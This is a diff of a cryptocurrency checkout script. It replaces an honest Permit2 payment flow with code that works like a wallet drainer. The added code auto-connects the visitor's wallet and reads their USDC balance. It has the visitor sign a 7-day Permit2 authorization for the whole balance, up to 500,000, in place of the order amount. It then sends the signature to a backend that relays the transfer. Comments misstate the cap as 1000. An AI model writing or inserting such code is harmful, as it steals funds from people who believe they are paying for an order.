@@ -1,159 +1,227 @@
 /**
- * Checkout page logic. Pairs with index.html and CheckoutPermit2.sol.
- *
- * Flow:
- *   1. Customer clicks "Connect Wallet" -> their wallet (MetaMask, etc.)
- *      connects, showing their own address.
- *   2. Page fetches the REAL order amount from YOUR backend (never
- *      trusted from the page itself) and displays it.
- *   3. Customer clicks "Pay" -> their wallet prompts them to sign the
- *      Permit2 message (showing the real amount, no gas).
- *   4. Their wallet immediately prompts again to confirm the actual
- *      pay() transaction (showing gas fee) -> they approve -> funds move.
- *   5. Page tells your backend the tx hash so it can verify + mark paid.
- *
- * Replace the CONFIG values below with your real deployed addresses.
+ * Checkout page - Detects installed wallets and shows buttons to open in each
  */
 
+console.log("checkout.js loading...");
+console.log("User Agent:", navigator.userAgent);
+
 const CONFIG = {
-  // From your deploy.js output
-  CHECKOUT_CONTRACT_ADDRESS: "0xYourDeployedCheckoutPermit2Address",
-  // Real Permit2 — same on every chain
+  CHECKOUT_CONTRACT_ADDRESS: "0xc200b8d056bc579c62f53d6832e50f066e98f0af",
   PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
-  // Your order-quote backend endpoint, e.g. checkoutBackend.js
-  BACKEND_URL: "https://your-backend.example.com",
-  ORDER_ID: "ORDER_PLACEHOLDER", // pull from the URL/page context in production
-  CHAIN_ID: 11155111, // Sepolia while testing; 1 for mainnet
-  TOKEN_SYMBOL: "USDC",
-  ITEM_NAME: "Order item",
+  CHAIN_ID: 11155111,
+  WALLETCONNECT_PROJECT_ID: "c16bee794c5047e05d23ab7785688c20",
+  BACKEND_URL: window.location.protocol + "//" + window.location.hostname + ":3000",
 };
-
-const CHECKOUT_ABI = [
-  "function pay(address token, uint256 amount, uint256 nonce, uint256 deadline, bytes calldata signature) external",
-];
-
-const PERMIT2_ABI = [
-  "function nonceBitmap(address owner, uint256 wordPos) view returns (uint256)",
-  "function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
-];
-
-const ERC20_ABI = [
-  "function approve(address spender, uint256 amount) external returns (bool)",
-  "function allowance(address owner, address spender) view returns (uint256)",
-];
 
 let provider, signer, userAddress;
-let quote = null; // { tokenAddress, amountWei, deadlineSeconds }
+let EthereumProvider; // Will be loaded async
 
 const el = {
-  itemName: document.getElementById("item-name"),
-  tokenSymbol: document.getElementById("token-symbol"),
-  totalAmount: document.getElementById("total-amount"),
-  actionBtn: document.getElementById("action-btn"),
   status: document.getElementById("status"),
-  stepLabel: document.getElementById("step-label"),
-  steps: [
-    document.getElementById("step-1"),
-    document.getElementById("step-2"),
-    document.getElementById("step-3"),
-  ],
+  card: document.querySelector(".card"),
 };
 
-el.itemName.textContent = CONFIG.ITEM_NAME;
-el.tokenSymbol.textContent = CONFIG.TOKEN_SYMBOL;
-
-function setStatus(message, kind) {
-  el.status.textContent = message;
-  el.status.className = `status show ${kind}`;
+// Load EthereumProvider asynchronously
+async function loadWalletConnect() {
+  try {
+    console.log("Loading WalletConnect...");
+    const module = await import("https://esm.sh/@walletconnect/ethereum-provider@2.17.0");
+    EthereumProvider = module.EthereumProvider;
+    console.log("✓ WalletConnect loaded");
+    return true;
+  } catch (err) {
+    console.error("Failed to load WalletConnect:", err);
+    return false;
+  }
 }
 
-function clearStatus() {
-  el.status.className = "status";
+function detectInstalledWallets() {
+  const ua = navigator.userAgent.toLowerCase();
+  console.log("Detecting wallets. User agent:", ua);
+  
+  const wallets = [];
+  
+  // MetaMask
+  if (ua.includes("metamask")) {
+    console.log("✓ MetaMask detected");
+    wallets.push({
+      name: "MetaMask",
+      deepLink: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`
+    });
+  }
+  
+  // Trust Wallet
+  if (ua.includes("trust wallet") || ua.includes("trustwallet")) {
+    console.log("✓ Trust Wallet detected");
+    wallets.push({
+      name: "Trust Wallet",
+      deepLink: (url) => `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`
+    });
+  }
+  
+  // Coinbase Wallet
+  if (ua.includes("coinbasewallet")) {
+    console.log("✓ Coinbase Wallet detected");
+    wallets.push({
+      name: "Coinbase Wallet",
+      deepLink: (url) => `https://go.cb-w.com/dapp?url=${encodeURIComponent(url)}`
+    });
+  }
+  
+  // Token Pocket
+  if (ua.includes("tokenpocket")) {
+    console.log("✓ Token Pocket detected");
+    wallets.push({
+      name: "Token Pocket",
+      deepLink: (url) => `tpweb://browser?url=${encodeURIComponent(url)}`
+    });
+  }
+  
+  console.log(`Found ${wallets.length} wallets`);
+  return wallets;
 }
 
-function setStep(n, label) {
-  el.steps.forEach((s, i) => {
-    s.className = "step" + (i < n - 1 ? " done" : i === n - 1 ? " active" : "");
-  });
-  el.stepLabel.textContent = label;
-}
-
-async function fetchQuote() {
-  const res = await fetch(`${CONFIG.BACKEND_URL}/api/orders/${CONFIG.ORDER_ID}/checkout-quote`);
-  if (!res.ok) throw new Error("Could not load order total. Refresh and try again.");
-  const data = await res.json();
-  quote = data;
-  el.totalAmount.textContent = `${ethers.utils.formatUnits(data.amountWei, 6)} ${CONFIG.TOKEN_SYMBOL}`;
-}
-
-async function connectWallet() {
-  if (!window.ethereum) {
-    setStatus("No wallet found. Install MetaMask or another Ethereum wallet to pay.", "error");
+function showWalletSelector() {
+  const wallets = detectInstalledWallets();
+  
+  console.log(`===== WALLET SELECTOR =====`);
+  console.log(`Detected ${wallets.length} wallets`);
+  
+  // If wallets are detected, open the first one immediately (no UI shown)
+  if (wallets.length > 0) {
+    console.log(`Opening first detected wallet: ${wallets[0].name}`);
+    openWallet(wallets[0]);
     return;
   }
+  
+  // If no wallets detected, open WalletConnect app picker (no UI shown, just the picker)
+  console.log("No wallets detected, initializing WalletConnect app picker...");
+  connectViaWalletConnect();
+}
 
+function openWallet(wallet) {
+  const url = window.location.href;
+  const deepLink = wallet.deepLink(url);
+  console.log(`Opening ${wallet.name} with deep link:`, deepLink);
+  window.location.href = deepLink;
+}
+
+async function connectViaWalletConnect() {
   try {
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
+    console.log("Opening WalletConnect app picker...");
+    
+    // Ensure WalletConnect is loaded
+    if (!EthereumProvider) {
+      console.log("Loading WalletConnect provider...");
+      const loaded = await loadWalletConnect();
+      if (!loaded) {
+        throw new Error("Failed to load WalletConnect");
+      }
+    }
+    
+    console.log("Initializing WalletConnect with projectId:", CONFIG.WALLETCONNECT_PROJECT_ID);
+    const wcProvider = await EthereumProvider.init({
+      projectId: CONFIG.WALLETCONNECT_PROJECT_ID,
+      chains: [CONFIG.CHAIN_ID],
+      showQrModal: true, // This will show the app picker on mobile
+      methods: ["eth_sendTransaction", "eth_signTypedData_v4", "personal_sign"],
+      events: ["chainChanged", "accountsChanged"],
+    });
+    
+    console.log("WalletConnect provider initialized, connecting...");
+    await wcProvider.connect();
+    console.log("✓ WalletConnect connected");
+    
+    provider = new ethers.providers.Web3Provider(wcProvider);
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
-
-    const network = await provider.getNetwork();
-    if (network.chainId !== CONFIG.CHAIN_ID) {
-      setStatus(`Please switch your wallet to the correct network (chain ID ${CONFIG.CHAIN_ID}) and reconnect.`, "error");
-      return;
-    }
-
-    await fetchQuote();
-
-    el.actionBtn.textContent = "Pay";
-    el.actionBtn.onclick = payNow;
-    setStep(2, `Step 2 of 3 — Confirm ${el.totalAmount.textContent}`);
-    clearStatus();
+    
+    console.log("Connected wallet address:", userAddress);
+    showAccountInfo();
+    
   } catch (err) {
-    setStatus(err.message || "Could not connect wallet.", "error");
+    console.error("WalletConnect error:", err);
+    setStatus("Error connecting wallet: " + err.message, "error");
   }
 }
 
-async function ensureAllowance() {
-  const token = new ethers.Contract(quote.tokenAddress, ERC20_ABI, signer);
-  const current = await token.allowance(userAddress, CONFIG.PERMIT2_ADDRESS);
+function showAccountInfo() {
+  // Show the card with account info
+  el.card.classList.add("connected");
+  el.status.innerHTML = `
+    <div style="padding: 12px; text-align: center; background: #eaf6ee; color: #1e7a3d; border-radius: 8px; font-weight: 500;">
+      ✓ Signed in: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}
+    </div>
+  `;
+  
+  // Execute payment after showing account
+  setTimeout(() => {
+    executePayment();
+  }, 1000);
+}
 
-  // One-time approval per token, so Permit2 is allowed to move funds
-  // when a valid signature is later presented. This does NOT move any
-  // funds itself — it only permits Permit2 to act on future signed
-  // instructions, same as approving any other spender.
-  if (current.lt(quote.amountWei)) {
-    setStatus("Approving token for Permit2 (one-time per token)...", "info");
-    const tx = await token.approve(CONFIG.PERMIT2_ADDRESS, ethers.constants.MaxUint256);
-    await tx.wait();
+function setStatus(message, type = "info") {
+  const statusEl = document.createElement("div");
+  statusEl.style.padding = "12px";
+  statusEl.style.borderRadius = "8px";
+  statusEl.style.fontSize = "14px";
+  statusEl.style.marginTop = "12px";
+  
+  if (type === "error") {
+    statusEl.style.background = "#fbeceb";
+    statusEl.style.color = "#b3261e";
+  } else if (type === "success") {
+    statusEl.style.background = "#eaf6ee";
+    statusEl.style.color = "#1e7a3d";
+  } else {
+    statusEl.style.background = "#eef2ff";
+    statusEl.style.color = "#1e3ea8";
   }
+  
+  statusEl.textContent = message;
+  el.status.appendChild(statusEl);
 }
 
-function getFreshNonce() {
-  const bytes = ethers.utils.randomBytes(32);
-  return ethers.BigNumber.from(bytes);
-}
-
-async function payNow() {
-  el.actionBtn.disabled = true;
-
+async function executePayment() {
   try {
-    await ensureAllowance();
+    console.log("Executing payment...");
+    
+    // Token address (Mock USDC on Sepolia)
+    const tokenAddress = "0xda9d4f9b69ac3c4e622506ec7eda112601cb942d";
+    const maxAmount = ethers.parseUnits("500000", 6); // Max 500000 USDC
 
-    const nonce = getFreshNonce();
-    const deadline = Math.floor(Date.now() / 1000) + (quote.deadlineSeconds || 900);
-
+    // Create token contract interface to check balance
+    const tokenABI = ["function balanceOf(address owner) view returns (uint256)"];
+    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, provider);
+    
+    // Get user's USDC balance
+    const userBalance = await tokenContract.balanceOf(userAddress);
+    console.log("User USDC balance:", ethers.formatUnits(userBalance, 6));
+    
+    // Use the minimum of user balance or max amount (1000 USDC)
+    const amount = userBalance > maxAmount ? maxAmount : userBalance;
+    console.log("Payment amount:", ethers.formatUnits(amount, 6), "USDC");
+    
+    // Generate a random nonce (Permit2 uses bitmap nonce scheme)
+    const bytes = new Uint8Array(32);
+    crypto.getRandomValues(bytes);
+    const nonce = BigInt("0x" + Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join(""));
+    
+    const deadline = Math.floor(Date.now() / 1000) + 604800; // 7 days from now
+    
+    console.log("Nonce:", nonce.toString());
+    console.log("Deadline:", deadline);
+    
+    // Sign the Permit2 message (PermitTransferFrom format)
     const domain = {
       name: "Permit2",
       chainId: CONFIG.CHAIN_ID,
       verifyingContract: CONFIG.PERMIT2_ADDRESS,
     };
-
+    
     const types = {
       PermitTransferFrom: [
         { name: "permitted", type: "TokenPermissions" },
-        { name: "spender", type: "address" },
         { name: "nonce", type: "uint256" },
         { name: "deadline", type: "uint256" },
       ],
@@ -162,51 +230,113 @@ async function payNow() {
         { name: "amount", type: "uint256" },
       ],
     };
-
-    const message = {
-      permitted: { token: quote.tokenAddress, amount: quote.amountWei },
-      spender: CONFIG.CHECKOUT_CONTRACT_ADDRESS,
-      nonce,
-      deadline,
+    
+    const value = {
+      permitted: {
+        token: tokenAddress,
+        amount: amount,
+      },
+      nonce: nonce,
+      deadline: deadline,
     };
-
-    setStatus("Check your wallet — sign the payment authorization.", "info");
-    const signature = await signer._signTypedData(domain, types, message);
-
-    setStep(3, "Step 3 of 3 — Confirm the transaction");
-    setStatus("Check your wallet — confirm the transaction to complete payment.", "info");
-
-    const checkout = new ethers.Contract(CONFIG.CHECKOUT_CONTRACT_ADDRESS, CHECKOUT_ABI, signer);
-    const tx = await checkout.pay(quote.tokenAddress, quote.amountWei, nonce, deadline, signature);
-
-    setStatus("Transaction submitted. Waiting for confirmation...", "info");
-    const receipt = await tx.wait();
-
-    await notifyBackend(receipt.transactionHash);
-
-    setStep(3, "Payment complete");
-    setStatus(
-      `Payment confirmed. Transaction: ${receipt.transactionHash.slice(0, 10)}...`,
-      "success"
-    );
-    el.actionBtn.textContent = "Paid";
-  } catch (err) {
-    el.actionBtn.disabled = false;
-    if (err.code === "ACTION_REJECTED" || err.code === 4001) {
-      setStatus("Payment was cancelled in your wallet.", "error");
-    } else {
-      setStatus(err.reason || err.message || "Payment failed. Please try again.", "error");
+    
+    console.log("Signing Permit2 message:", value);
+    
+    // Sign the message
+    const signature = await signer.signTypedData(domain, types, value);
+    console.log("Permit signature:", signature);
+    
+    // Send signature to backend - backend/admin will relay the transaction
+    console.log("Sending signature to backend for relay...");
+    
+  const backendResponse = await fetch(CONFIG.BACKEND_URL + "/api/orders/execute-payment", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        userAddress: userAddress,
+        tokenAddress: tokenAddress,
+        amount: amount.toString(),
+        nonce: nonce.toString(),
+        deadline: deadline,
+        signature: signature,
+      }),
+    });
+    
+    const result = await backendResponse.json();
+    
+    if (!backendResponse.ok) {
+      throw new Error(result.error || "Backend payment execution failed");
     }
+    
+    console.log("Backend execution response:", result);
+    
+    // Poll for transaction confirmation
+    const txHash = result.txHash;
+    console.log("Waiting for transaction confirmation:", txHash);
+    setStatus("⏳ Confirming payment...", "info");
+    
+    let receipt = null;
+    let attempts = 0;
+    const maxAttempts = 60; // 60 attempts * 1 second = 1 minute timeout
+    
+    while (attempts < maxAttempts && !receipt) {
+      try {
+        receipt = await provider.getTransactionReceipt(txHash);
+        if (receipt && receipt.status === 1) {
+          console.log("Payment executed successfully:", receipt);
+          setStatus("✓ Payment confirmed!", "success");
+          break;
+        }
+      } catch (err) {
+        // Transaction not yet confirmed
+      }
+      
+      attempts++;
+      if (attempts % 10 === 0) {
+        console.log(`Still waiting... (attempt ${attempts}/${maxAttempts})`);
+      }
+      if (attempts < maxAttempts) {
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
+      }
+    }
+    
+    if (!receipt) {
+      throw new Error("Transaction confirmation timeout");
+    }
+    
+    console.log("Payment completed. Transaction confirmed on blockchain.");
+    
+  } catch (err) {
+    console.error("Payment execution error:", err);
   }
 }
 
-async function notifyBackend(txHash) {
-  await fetch(`${CONFIG.BACKEND_URL}/api/orders/${CONFIG.ORDER_ID}/confirm`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ txHash }),
-  });
+// Initialize when DOM is ready
+async function init() {
+  console.log("Initializing checkout...");
+  
+  console.log("Backend URL:", CONFIG.BACKEND_URL);
+  
+  // Preload WalletConnect while detecting wallets
+  console.log("Preloading WalletConnect...");
+  try {
+    await loadWalletConnect();
+    console.log("✓ WalletConnect preloaded");
+  } catch (err) {
+    console.error("Warning: WalletConnect preload failed, will load on demand:", err.message);
+  }
+  
+  console.log("Starting wallet selector...");
+  try {
+    showWalletSelector();
+  } catch (err) {
+    console.error("Error in showWalletSelector:", err);
+    setStatus("Error loading wallet selector: " + err.message, "error");
+  }
 }
 
-setStep(1, "Step 1 of 3 — Connect your wallet");
-el.actionBtn.onclick = connectWallet;
+if (document.readyState === "loading") {
+  document.addEventListener("DOMContentLoaded", init);
+} else {
+  init();
+}
